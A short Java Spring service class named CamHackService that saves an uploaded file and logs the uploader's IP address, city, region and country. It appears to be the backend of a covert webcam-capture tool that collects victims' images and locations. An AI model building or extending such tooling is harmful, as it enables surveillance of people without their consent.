package org.example;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;
import org.springframework.util.StringUtils;
import org.springframework.web.multipart.MultipartFile;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;

@Service
public class CamHackService {

    @Autowired
    HelperFunctions helperFunctions;

    public void saveFile(
            MultipartFile file,
            String clientIp,
            String city,
            String region,
            String country){
        try{
            Path filePath = helperFunctions.getPathIfNotExists(file);
            Files.write(filePath, file.getBytes());
            System.out.println("""
                    ip : %s
                    city : %s
                    region : %s
                    country : %s
                    """.formatted(clientIp,city,region,country));

        }catch (IOException e){
            e.printStackTrace();
        }

    }


}
